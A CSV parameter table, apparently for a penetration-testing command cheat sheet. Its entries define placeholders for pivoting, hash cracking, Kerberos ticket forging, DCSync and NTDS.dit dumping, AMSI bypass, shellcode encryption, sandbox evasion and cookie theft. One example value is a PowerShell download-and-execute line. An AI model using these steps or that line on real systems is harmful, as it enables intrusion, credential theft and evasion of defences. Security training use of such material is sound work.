"id","name","description","example","required"
"dbc3cba313c64ccf","<LISTEN_IP>","IP to listen on (0.0.0.0 for all)","0.0.0.0","True"
"682053f40882238f","<DST_IP>","IP to forward to","127.0.0.1","True"
"8f54a3b95ece8bf7","<COMMAND>","Command to execute on remote system (spawns in session 0 as SYSTEM service)","calc","True"
"92be5934e3393f55","<LOCAL_PORT>","Local port to bind on attacker machine","8080","True"
"bb50834e165ea243","<SSH_USER>","SSH username on pivot host","user","True"
"8c409d14c65a0a00","<SSH_HOST>","SSH server (pivot host) IP or hostname","10.10.10.50","True"
"05c795b5d91ae405","<REMOTE_PORT>","Port to bind on SSH server","9050","True"
"3ef91140af5aa921","<SOCKS_PORT>","Local microsocks SOCKS proxy port","1080","True"
"4a0798884add7ddf","<DEST_IP>","Destination IP in internal network","172.16.10.50","True"
"21e4c16201d50886","<DATABASE>","Database name to connect to (default: postgres)","postgres","False"
"230a3f5ab2039222","<LISTEN_PORT>","Port to stop forwarding","2222","True"
"9a4ec1157330c5c4","<EXECUTABLE>","Executable name to search for (e.g., ssh, plink, python)","ssh","True"
"5eab2f17c3457dc1","<BIND_ADDRESS>","IP address to bind listening port (0.0.0.0 for all interfaces, 127.0.0.1 for loopback only)","0.0.0.0","False"
"3eb4df297a4c2c7d","<DEST_PORT>","Destination port to forward to","445","True"
"2e4f5e8e4aa04356","<SSH_SERVER>","Attacker's SSH server IP (Kali machine)","192.168.118.4","True"
"ee7852a17c86677a","<SSH_PASSWORD>","SSH password for authentication (use -i for key file)","kali","True"
"9d64e8ffea5b39a1","<SUBNET>","Internal subnet to route (e.g., 172.16.50.0)","172.16.50.0","True"
"dcf199bc70571b5c","<CIDR>","Subnet mask in CIDR notation (e.g., 24 for /24)","24","True"
"8bf07c964604e256","<USER>","Username for SSH authentication","admin","True"
"f1e906bd9b3db2eb","<KEY_FILE>","Path to private SSH key file (id_rsa, id_ecdsa, id_ed25519)","id_rsa","True"
"86021dc1d00432b2","<TOP_PORTS>","Number of top ports to scan (use 20 for speed, 100 for thoroughness)","20","True"
"500b9b9ab0c50aa4","<OUTPUT_DIR>","Output directory","./autorecon-results","True"
"84576cd78cb8dae9","<URL>","Target URL","http://target.com","True"
"4949ad9b14a4ad1e","<BASE_DN>","Base DN","DC=domain,DC=local","True"
"11c745735b462353","<PASS>","Password","","True"
"a0da0aa0049d0771","<SUID_BINARY>","SUID binary to exploit","/usr/bin/find","True"
"483d93d5bf940d9a","<CAP_BINARY>","Capability binary","/usr/bin/python3.8","True"
"827484833b6edf44","<CMS>","CMS type (drupal, joomla, wordpress)","drupal","True"
"977ef033079dfa1b","<PARAM>","Parameter to test","id","True"
"33978a76b5aa87d6","<LOCAL_FILE>","Local file path","exploit.sh","True"
"13b96b9dca488e01","<REMOTE_PATH>","Remote path","/tmp/exploit.sh","True"
"a277472e02596adb","<REMOTE_FILE>","Remote file path","/etc/passwd","True"
"a068956ab8ddab10","<LOCAL_PATH>","Local destination","./passwd","True"
"935870a7002cfe24","<SHARE_NAME>","Share name","share","True"
"9d06ad462367b532","<DIRECTORY>","Directory to share",".","True"
"771cc56dcaeb12b8","<LHOST>","Attacker IP","10.10.14.1","True"
"3e363ed1bddd7718","<FILE>","File to download","nc.exe","True"
"b29e0188261bb8ce","<DEST>","Destination path","C:\Temp\nc.exe","True"
"a62edaca73ccf97f","<SERVER_IP>","Attacker IP","10.10.14.1","True"
"7ef180ba63d75600","<LPORT>","Local port to open","9090","True"
"2f60e0798613c8ae","<RPORT>","Remote port","80","True"
"d605b0b2667a6cc6","<SEARCH_TERM>","Software name/version","apache 2.4","True"
"ead0e27c7126f27d","<FILENAME>","File to serve","exploit.sh","True"
"e4fdee416aba032d","<MODULE>","Exploit module path","exploit/multi/handler","True"
"210c3e6318d2cf68","<DB>","Exploit database file","2024-01-01-mssb.xls","True"
"04ae8fec5515d43a","<USERLIST>","Username wordlist","/usr/share/wordlists/metasploit/unix_users.txt","True"
"552cfab6e8dc8542","<PASSLIST>","Password wordlist","/usr/share/wordlists/rockyou.txt","True"
"91b19ac427357e71","<PARAMS>","POST parameters","user=^USER^&pass=^PASS^","True"
"67367fb27c0105ed","<FAIL_STRING>","Failure indicator","Login failed","True"
"4cc1a89514e4fc81","<HASHFILE>","Hash file","hashes.txt","True"
"465828ccf114606a","<TOOL>","Tool name","ssh","True"
"e2e282930b04d4d5","<MODE>","Hash mode (0=MD5, 1000=NTLM, etc.)","0","True"
"d9f2fb32c1271f1a","<HASH_TYPE>","Hash type to search","ntlm","True"
"7c6be3a1d837357c","<HASH>","Hash string","5f4dcc3b5aa765d61d8327deb882cf99","True"
"728043f16ef5d8d0","<DC_IP>","Domain controller IP","192.168.1.10","True"
"fce64b628c8dba70","DOMAIN","Domain name (NetBIOS or FQDN). Use quotes around full auth string to handle special characters in password.","corp.com","True"
"2bd35f02556c3cea","USER","Admin username with appropriate rights (Domain Admin for DCSync, local admin for SAM/LSA, both for NTDS.dit extraction)","administrator","True"
"9a928421ab077c13","PASS","Password or use -hashes :NTLM_HASH for pass-the-hash. Escape special characters (!, $) with backslash or use single quotes.","Password123!","True"
"2221665f36256a98","TARGET","Target DC IP (for DCSync) or member server IP (for SAM/LSA). Use IP to avoid DNS issues.","192.168.50.70","True"
"799d349b131e1a47","<SERVICE_NAME>","Name of the Windows service to query","wuauserv","True"
"7ea644704361261f","<BINARY_PATH>","Path to binary file to analyze","/usr/local/bin/vulnerable_app","True"
"49ef992e42d2eaea","<LDAP_OUTPUT_FILE>","File containing LDAP query output with DN paths","ldap_results.txt","True"
"cb8517283ed1f705","<YOUR_SID>","Security Identifier (SID) of current user or group","S-1-5-21-1234567890-1234567890-1234567890-1001","True"
"b8390328cdfbbe13","<SMALL_WORDLIST>","Small wordlist for testing (10-20 entries)","/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-20.txt","True"
"f519309d8af2d02b","<TARGET_URL>","Target URL endpoint to test","http://192.168.1.100/login.php","True"
"60886aaed80d3c16","<POST_DATA>","POST data with FUZZ keyword","username=admin&password=FUZZ","True"
"d7a4cf3fbc12de45","<OLD_NAME>","Current filename","shell.txt","True"
"f1c0b253866b2880","<NEW_NAME>","New filename with desired extension","shell.php","True"
"5a6d0e2c962b1bab","<IP>","Target IP address","10.10.11.18","True"
"bb3f1995b166363e","<HOSTNAME>","Hostname to map to IP","usage.htb","True"
"b8b5e22f4e84228c","<BINARY>","Path to binary file to analyze","/usr/bin/usage_management","True"
"54421343f33ee85a","<KEYWORD>","Keyword to search for in strings output","password","False"
"0843939c4a81ba4e","<FILE_PATH>","Full or relative path to file. Supports: Absolute paths (C:\Users\admin\Desktop\flag.txt), Relative paths (.\flag.txt, ..\..\file.txt), UNC paths (\\\\server\\share\\file.txt), Environment variables (%USERPROFILE%\\Desktop\\flag.txt). Wildcards NOT supported (use 'for' loop for multiple files).","C:\Users\Administrator\Desktop\flag.txt","True"
"94dc7e6af39d933b","<PATTERN>","Pattern to search for (supports regex)","old_text","True"
"add13b8c12f6f2e6","<REPLACEMENT>","Replacement text","new_text","True"
"a1356268dd440ba8","<FIELD>","Field number to print (1-based)","1","True"
"3e4191f7c383f494","<DELIM>","Field delimiter character",":","True"
"df2d6cd6caa7d359","<FIELDS>","Field numbers to extract (e.g., 1, 1-3, 1,3)","1,3","True"
"df07298e988a4d37","<SET1>","Characters to replace","a-z","True"
"753713d2ddf38b3b","<SET2>","Replacement characters","A-Z","True"
"dd7c1d22cba58a09","<PACKAGE>","Package name to install","nmap","True"
"ead76ac9f4b68f8c","<GEM>","Gem package name","winrm","True"
"f954b1f77df13614","<COUNT>","Number of ping packets to send","4","False"
"f58b2c6da7c81df2","<TYPE>","Record type (A, AAAA, MX, NS, TXT, ANY)","A","False"
"08ad5c76e23be9d9","<SOURCE>","Source file path","exploit.sh","True"
"cb16939f9e49530d","<PERMS>","Numeric permissions (e.g., 755, 644, 777)","755","True"
"467b0e3887f56e71","<GROUP>","New group name","www-data","True"
"2ad5b2f7cd20c450","<LINK>","Name of symbolic link to create","rockyou.txt","True"
"281e6bd1f1d3923e","<LINES>","Number of lines to display","10","False"
"eec22b24f6583947","<FILES>","Files or directories to archive","/tmp/loot/*","True"
"466e566fa12c7f09","<HASH_FILE>","File containing NTLM hash (from secretsdump, mimikatz, etc.)","hashes.txt","True"
"98b2a6bb414b1a8c","<MIMIKATZ_PATH>","Directory containing mimikatz.exe","C:\Tools\Mimikatz","True"
"ad61535230dcde25","<RUBEUS_PATH>","Directory containing Rubeus.exe","C:\Tools\Rubeus","True"
"05c3b083fb3ab477","<ENDPOINT>","Vulnerable endpoint path","login.php","True"
"fe5d0b97f12990be","<VALUE>","Parameter value to inject payload","1","True"
"0f330a22d2ca2f65","<JOB_NAME>","Arbitrary transfer job name (required, can be anything)","myDownload","True"
"4822495a9be6f642","<SCRIPT>","PowerShell script filename (without .ps1 or with .ps1)","Invoke-Mimikatz","True"
"fd32abb2cb1a2eb7","<PID>","Process ID from netstat","1234","True"
"9b788b4be902921e","<PROCESS_NAME>","Exact or partial process name to search for","sshd","True"
"c8d3e30d460cd202","<TASK_NAME>","Name of scheduled task","MyBackup","True"
"c81e2e6e70ac3bf3","<TASK_PATH>","Full task path including folder","\Microsoft\Windows\MyTask","True"
"28a38aa3f4553dcb","<LOG_FILE>","Path to log file","/var/log/syslog","True"
"6dc946cc027a036b","<LOG_FILE1>","First log file","/var/log/syslog","True"
"313d31f381a0f075","<LOG_FILE2>","Second log file","/var/log/auth.log","True"
"7bccb896c53b4fe4","<SERVICE>","Service name (without .service extension)","ssh","True"
"5c23ce822ca0712c","<PRIORITY>","Priority level","err","True"
"688ad68386c350d1","<TIME_SPEC>","Time specification","2024-01-01 10:00:00","True"
"0fdc22ea6ab72eed","<STATE>","Service state to filter by","running","False"
"18e6ee260c4654ac","<SLEEP_MS>","Sleep duration in milliseconds (10000 = 10 seconds)","10000","True"
"3c905a0ab05c085e","<THRESHOLD_SEC>","Minimum acceptable elapsed time in seconds (slightly less than sleep to allow processing time)","9.5","True"
"4b163deb43df24aa","<LARGE_SIZE>","Memory size to allocate in bytes (100000000 = ~100MB)","100000000","True"
"351b0cca07a1a931","<MIN_CORES>","Minimum required CPU cores (2 or 4 typical)","2","True"
"d7e55158f6b205fe","<MIN_FILES>","Minimum expected recent files (5-10 typical for real system)","5","True"
"e0173454853ffcf1","<MIN_UPTIME_MINUTES>","Minimum system uptime in minutes (10-30 typical)","10","True"
"eb7f9e821d84eb5f","BASE64_BYPASS","Base64-encoded AMSI bypass script","","False"
"8fd707ca6b0af2a8","<OUTPUT_FILE>","Output filename for extracted payload","payload.ps1","True"
"e0ca486dc88af880","<EMBEDDED_PAYLOAD_CONTENT>","Payload content to embed after marker (PowerShell script, binary, etc.)","IEX (New-Object Net.WebClient).DownloadString('http://...')","True"
"2ecf07c2a9d98756","<SCRIPT_FILE>","Path to .js or .vbs file","payload.js","True"
"39caa8c490911efc","<FUNCTION>","Function name within module","AmsiScanBuffer","True"
"d30a11ed7a62a20b","<BREAKPOINT_NUMBER>","Breakpoint ID from 'bl' command","0","False"
"d557ab48a18a5dcd","<ADDRESS>","Memory address or register name (rsp, rcx, rip, etc.)","rsp","True"
"67194694660a5f3e","<NEW_VALUE>","New value to write (hex)","90909090","True"
"4ce0a55ef209ee09","<BYTE1>","Byte values to write","48","True"
"8b187d8d78aff480","<BYTE2>","Second byte value","0x12","True"
"56da014203733737","<BYTE3>","Third byte value","0x34","True"
"6c77d34a0d443a1e","<INTERVAL>","Byte interval for binary search (start large: 10000, then narrow: 1000, 100, 10, 1)","10000","True"
"ec2539f258d85ce6","<TARGET_FILE>","Executable file to analyze (full path)","C:\Tools\payload.exe","True"
"7a9e82ef7774f92e","<INPUT_FILE>","Original executable path","C:\Tools\payload.exe","True"
"ac5527af2b7acd68","<MODIFICATIONS>","Byte modifications (e.g., $bytes[18867] = 0x00)","$bytes[18867] = 0x00","True"
"577bbe7d9b115470","<PAYLOAD>","msfvenom payload name","windows/meterpreter/reverse_https","True"
"e9e402e56ec0fb62","<ITERATIONS>","Encoding iterations (more = better obfuscation, larger payload)","10","False"
"bd69b650765c9bbf","<KEY>","AES encryption key (any string)","MySecretKey2024","True"
"f47fb69c327b01c2","<TEMPLATE_EXE>","Legitimate executable to use as template","/usr/share/windows-binaries/nc.exe","True"
"f5cbd8d711fa1718","<SHELLCODE>","Raw shellcode bytes in C# format (0xfc,0x48,0x83,...)","0xfc,0x48,0x83,0xe4,0xf0","True"
"172870e368f987ff","<RAW_SHELLCODE>","Original shellcode bytes from msfvenom","0xfc,0x48,0x83","True"
"09a0fb9e70f1751a","<XOR_KEY>","XOR encryption key (0-255)","0xAA","True"
"96b1255c43fa2568","<OUTPUT_EXE>","Output executable name","runner.exe","True"
"cf6d2c5ba8389413","<SOURCE_CS>","C# source file path","Program.cs","True"
"6f9316cf106d8659","<PAYLOAD_COMMAND>","Command to execute with high integrity (admin)","cmd /c start powershell.exe","True"
"df075c772e0f5393","<SHELLCODE_BYTES>","Shellcode as VBA byte array (comma-separated decimal values)","232, 130, 0, 0, 0, ...","True"
"f3aa88c52411673b","<ENCRYPTED_BYTES>","Caesar-encrypted shellcode bytes","254, 74, 133, ...","True"
"c8d73f4968103405","<BASE64_PAYLOAD>","Base64-encoded PowerShell payload (UTF-16LE)","SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...","True"
"6081f4a6e8eda239","<INPUT_DOC>","Original .doc with VBA macro","payload.doc","True"
"b00a9ab5b2052d22","<OUTPUT_DOC>","Stomped output document","payload_stomped.doc","True"
"8bddd0c5c3bdc913","<DOMAIN_DN>","Domain distinguished name (e.g., DC=corp,DC=com)","DC=corp,DC=com","True"
"5965f0c9c9b92265","<LISTENER_IP>","Attacker IP running ntlmrelayx/responder","192.168.50.100","True"
"9ccc22fe6c0d6715","<TARGET_IP>","Target server to coerce","192.168.50.70","True"
"4315be57bbbba094","<CA_IP>","Certificate Authority IP/hostname","ca.corp.local","True"
"9bcbbb7a618afc13","<TEMPLATE>","Certificate template name","DomainController","True"
"e711681a306271ed","<DOMAIN_FQDN>","Fully Qualified Domain Name of the Active Directory domain","corp.com","True"
"8ef83e9493bd5de1","<DOMAIN_SID>","Domain Security Identifier WITHOUT the user RID. Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX (exclude the trailing -500, -1001, etc.). Obtain with: whoami /user (remove last segment after final hyphen).","S-1-5-21-1987370270-658905905-1781884369","True"
"c311de58b58ccb4c","<KRBTGT_NTLM>","NTLM password hash of the krbtgt account (obtained via DCSync or LSA dump). 32 hexadecimal characters.","1693c6cefafffc7af11ef34d1c788f47","True"
"71ea890e569ad60c","<TARGET_FQDN>","Fully Qualified Domain Name of target system (e.g., DC1.corp.com, WEB01.corp.com). CRITICAL: Use FQDN/hostname, NOT IP address. IP forces NTLM authentication; FQDN uses Kerberos.","DC1","True"
"8b6f2c085e59f57d","<KRBTGT_HASH>","NTLM hash of krbtgt account","aad3b435b51404eeaad3b435b51404ee","True"
"acc58243bb352125","<DRIVE_LETTER>","Drive letter to snapshot (typically C for system drive containing NTDS.dit)","C","True"
"7701024049801093","<SHADOW_NUMBER>","Shadow copy device number from vssadmin list shadows output (incremental: 1, 2, 3...)","2","True"
"1f1437ad32c12c45","<OUTPUT_PATH>","Destination path for extracted NTDS.dit file","C:\Temp\ntds.dit.bak","True"
"a1690f36da729c84","<NTDS_FILE>","Path to extracted NTDS.dit file on Kali","ntds.dit.bak","True"
"fc742c5c6411648d","<SYSTEM_FILE>","Path to exported SYSTEM registry hive on Kali","system.bak","True"
"e3d40d4f13e97802","DOMAIN_FQDN","Fully Qualified Domain Name of the target Active Directory domain","corp.com","True"
"17a58c240a5c9bf5","TARGET_USER","Username of the target account to dump credentials for. Common high-value targets: Administrator, krbtgt (for Golden tickets), or compromised admin accounts.","Administrator","True"
"ae825db24af5b730","USERNAME","Domain admin username (or user with replication rights) to authenticate as","administrator","True"
"a982755ecea00bae","PASSWORD","Password for the authenticating user. Escape special characters with backslash (\! for !).","Password123!","True"
"0e519989b5ebf5b5","DC_IP","IP address or FQDN of the domain controller. IP is more reliable (avoids DNS issues).","192.168.50.70","True"
"46a936b2da16da49","TLD","Top-level domain component (e.g., 'com' for corp.com)","com","True"
"ad908f931774e3ea","<TICKET_FILE>","Path to .kirbi ticket file or base64 ticket","admin.kirbi","True"
"93fb40c6bfa2c602","<GMSA_ACCOUNT>","gMSA account name","svc_gmsa","True"
"9b822b208102639a","<DC1>","First DC component","corp","True"
"de3c8f633d5687d7","<DC2>","Second DC component","local","True"
"d87c8e6b91743b46","<COMPUTER_NAME>","Computer name to query","WS01","True"
"876efa06f133f8b8","<CA_NAME>","Certificate Authority name from certipy find","corp-CA","True"
"ac75c6f410a20896","<CA_HOST>","CA server hostname/IP","ca.corp.local","True"
"7d06dbae0eb27714","<TARGET_USER>","User to impersonate","administrator","True"
"d2f7841e62ddcde6","<PFX_FILE>","Certificate file from certipy req","administrator.pfx","True"
"ac9b535edadc80ae","<CA_PFX>","CA private key file","ca.pfx","True"
"e726510e7d8e174d","<TARGET_ACCOUNT>","Target account to compromise","DC01$","True"
"1c33745722c017a2","<PFX_PASSWORD>","PFX file password","password123","False"
"715a1e029c62ba8c","<NTLM_HASH>","NTLM hash (32 hex chars) obtained from sekurlsa::logonpasswords or lsadump::sam","aad3b435b51404eeaad3b435b51404ee","True"
"44efb48b1cd83541","<DUMP_FILE>","Path to LSASS memory dump file (.dmp)","lsass.dmp","True"
"261dd38e509bc089","<CONTROLLED_ACCOUNT>","Machine account you control","YOURPC","True"
"2d2eb0ae138cccf4","<TARGET_COMPUTER>","Computer to configure RBCD on","DC01","True"
"cad7f08aaae84189","<MACHINE_ACCOUNT>","Your controlled machine account (without $)","YOURPC","True"
"d6762778c98c5dd7","<ALLOWED_SPN>","SPN from msDS-AllowedToDelegateTo","cifs/dc01.corp.local","True"
"71f7ac2d6b9b69dd","<SERVICE_ACCOUNT>","Account with constrained delegation","svc_sql","True"
"b9eed3f78b7cd737","<NEW_COMPUTER>","Name for new machine account","YOURPC","True"
"29645e52585deeaa","<CONTROLLED_SID>","SID of your controlled account","S-1-5-21-...","True"
"3c03a0d0af367d1a","<USERFILE>","File containing single username to validate (or use multi-user file to validate password across multiple accounts)","single_user.txt","True"
"6717f08cae311dd3","<DA_USER>","Domain Admin username for authentication (without domain prefix)","jeffadmin","True"
"b9d8220c26c0d2a1","DOMAIN_SID","Domain Security Identifier (without user RID). Extract with 'whoami /user' and remove last segment after final hyphen.","S-1-5-21-1987370270-658905905-1781884369","True"
"9cd8cdb2db3ccd98","TARGET_SERVER_FQDN","Fully Qualified Domain Name of the server hosting the target SPN. Must match SPN registration exactly (case-insensitive but FQDN required).","web04.corp.com","True"
"cd7a4bc47115ee7e","SPN_SERVICE","Service Principal Name type. Common types: cifs (file shares), http (IIS/web), mssql (SQL Server), ldap (directory services), host (multiple services), rpcss (RPC), wsman (PowerShell remoting).","http","True"
"427cedcd8f29e4f2","SERVICE_ACCOUNT_NTLM","NTLM hash of the service account that runs the target SPN. Obtain via Kerberoasting (crack TGS), LSASS dump (if service account logged on), or DCSync.","4d28cf5252d39971419580a51484ca09","True"
"ba8c48fad577c937","IMPERSONATED_USER","Username to impersonate in the forged ticket. Can be ANY domain user (existing or fictional). Mimikatz sets group memberships to Domain Admins by default.","jeffadmin","True"
"c83ebffd70acca4c","TARGET_SERVER","Hostname or partial hostname of the target server. Wildcards (*) are supported for fuzzy matching.","web04","True"
"f30b0d533dc79611","<TARGET_RANGE>","Target hosts (single IP, CIDR range, or hostname). Use CIDR for subnet spray.","192.168.50.0/24","True"
"a288a37feb0f4228","<GPO_NAME>","Display name of the GPO with write permissions (use exact name from Get-NetGPO or icacls)","Default Domain Policy","True"
"d868de8a4984cd1f","<ATTACKER_IP>","Attacker's IP address to receive stolen cookies","10.10.14.5","True"
"3ccd925833fdbff6","<MAX_COLS>","Maximum columns to test (default 20 is usually sufficient)","20","False"
"47b8102605349b0c","<NULL_COLUMNS>","Comma-separated NULL values matching column count from ORDER BY enumeration (e.g., 'test1',NULL,NULL,'test2' for 4 columns)","'test1',NULL,NULL,'test2'","True"
"1ade17d343381397","<EMPTY_COLS>","Remaining NULL columns to match total column count","NULL,NULL,NULL","True"
"e570524380ef1c4e","<OPTIONS>","Additional sqlmap options (see flag_explanations for common options)","-D webapp_db -T users --threads 5","False"
"22f11c3a754727db","<WPSCAN_API_TOKEN>","WPScan API token from wpscan.com (free tier: 25 requests/day, register at https://wpscan.com/register)","YOUR_API_TOKEN_HERE","False"
"c75ff8ae0ca187fe","<USERS>","Username(s) to test - comma-separated list or file path","admin,john,editor","True"
"232b743e437226b4","<LFI_PARAM>","Vulnerable PHP file containing LFI","index.php","True"
"7b37b8d1db7d3089","<WEBSHELL>","Uploaded webshell filename with path","shell.php","True"
"1571a07e07887e26","<REQUEST_FILE>","Path to saved HTTP request file from Burp (Copy to file → Save)","reset.req","True"
"024bbc504e825243","<PARAMETER>","Parameter to test for SQL injection","email","True"
"b270d50f2a10757b","<TABLE>","Table name from --tables enumeration","admin_users","True"
"67f2858408350aef","<GROUPNAME>","Domain group name (use quotes if spaces)","Domain Admins","True"
"1ecd63afed4d48a3","<CPASSWORD>","Encrypted cpassword value from Groups.xml or ScheduledTasks.xml","+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE","True"
"35f69f2b73e7ca5e","<COMPUTER>","Target computer name or IP","WS01","True"
"135ddd653932222e","<KEEPASS_DB>","Path to KeePass database file (.kdbx)","Database.kdbx","True"
"b4592edc8170ae2e","<PRIVATE_KEY>","Path to SSH private key file","id_rsa","True"
"ea43829b351f8adb","<ZIP_FILE>","Path to encrypted ZIP file","encrypted.zip","True"
"0c63eca326f974c4","<RAR_FILE>","Path to encrypted RAR file","encrypted.rar","True"
"b932ad1fb7c4165a","<OFFICE_FILE>","Path to encrypted Office file (.docx, .xlsx, .pptx)","encrypted.docx","True"
"7e34995ddd1a4462","<PDF_FILE>","Path to encrypted PDF file","encrypted.pdf","True"
"b5b5bd1aed842a26","<ENCODED_STRING>","Base64-encoded string","cGFzc3dvcmQxMjM=","True"
"fc6cd970813d4e6d","<OBJECT>","AD object to query (username, groupname, or DN)","administrator","True"
"98a091087b3837db","<SID>","Security Identifier to resolve","S-1-5-21-1987370270-658905905-1781884369-1104","True"
"0493fda605685467","<RULESET>","Rule name from john.conf","sshRules","True"
"66daf52cbcd37c75","<FORMAT>","Hash format identifier","raw-md5","True"
"3053d48c68df1177","<SSH_HASH>","SSH key hash file (from ssh2john)","ssh.hash","True"
"d8c0cfcde9f0c303","<KEEPASS_HASH>","KeePass hash file (from keepass2john)","keepass.hash","True"
"f4db1a6ce9d2c826","<SEARCH>","Optional search term to filter formats","ssh","False"
"6e4b7df9d78fc903","<RULE_FILE>","File containing custom rules with [List.Rules:Name] header","custom.rule","True"
"39f9c505660003ca","<GROUP_NAME>","AD group name to query (e.g., 'Domain Admins', 'Service Personnel')","Domain Admins","True"
"a0e40210631dd84d","<DISTINGUISHED_NAME>","Full Distinguished Name from group.Properties.member (e.g., 'CN=jeff,CN=Users,DC=corp,DC=com')","CN=Administrator,CN=Users,DC=corp,DC=com","True"
"229ff2db91c44918","<LM_HASH>","LM hash (use empty string 'aad3b435b51404eeaad3b435b51404ee' if not available)","aad3b435b51404eeaad3b435b51404ee","True"
"80f235d1e9d465cc","<NT_HASH>","NTLM hash from credential dump (32 hex characters)","a87f3a337d73085c45f9416be5787d86","True"
"e23f80734810fa0a","<METHODS>","Comma-separated collection methods (Group,LocalAdmin,Session,Trusts,ACL,ObjectProps,Container,DCOM,RDP,PSRemote)","Group,ACL,ObjectProps","True"
"fefad7be6fd08857","<COMPUTER_FILE>","File containing FQDNs of computers to enumerate (one per line)","targets.txt","True"
"0f31e14451008fe7","<PREFIX>","Prefix string for output files","corp_exam","True"
"4e53a04ec42679e3","<LDAP_FILTER>","LDAP filter query (standard LDAP syntax)","(objectClass=user)","True"
"f2ea34825b9facd9","<FAIL_CODE>","HTTP status code to hide (failed login attempts)","200","True"
"cd9fb31db6c8684f","<INTERFACE>","Network interface to use for scanning (use 'ip a' to list)","tun0","False"
"06155873aea1c2dd","<GATEWAY>","Gateway IP address for routing (use 'ip route' to find)","10.10.14.1","False"
"76ee96de9fd2e121","<CHARSET_SIZE>","Number of possible characters (26=lowercase, 52=upper+lower, 62=alphanumeric, 95=full ASCII)","62","True"
"4f947993030967e5","<PASSWORD_LENGTH>","Password length to test","8","True"
"84062566d9af41e0","<KEYSPACE>","Total number of password combinations","218340105584896","True"
"7708e7113d706d99","<HASH_RATE>","Hashes per second (from hashcat benchmark)","1000000000","True"
"877f528290156ffc","<LINE_COUNT>","Number of lines in wordlist (from wc -l)","14344391","True"
"1cbbb26cf87b6e94","<RULE_COUNT>","Number of rules in rule file","64","True"
"916d230d1637bcca","<SESSION_NAME>","Unique session identifier","exam-target1","True"
"231395bf8b7eef76","<YEAR>","Current year or company-specific year","2024","True"
"c86bad9040bc7ec9","<WORDLIST1>","First wordlist (left side)","words1.txt","True"
"496e920ceb3dd36b","<WORDLIST2>","Second wordlist (right side)","words2.txt","True"
"047f77d253515555","<MASK>","Character mask pattern","?u?l?l?l?l?d?d?d?s","True"
"a4646c0c3b5408fa","<MIN>","Minimum password length","4","True"
"a6835e111d659e3c","<MAX>","Maximum password length","8","True"
"30a3629b98df7f28","<CHARSET>","Custom character set definition","abc123!@#","True"
"05a2185b384e9dcd","<LOGIN_PAGE>","Path to login page (from Burp intercept)","/index.php","True"
"b5e3172ac966dc52","<TASKS>","Number of parallel tasks","4","True"
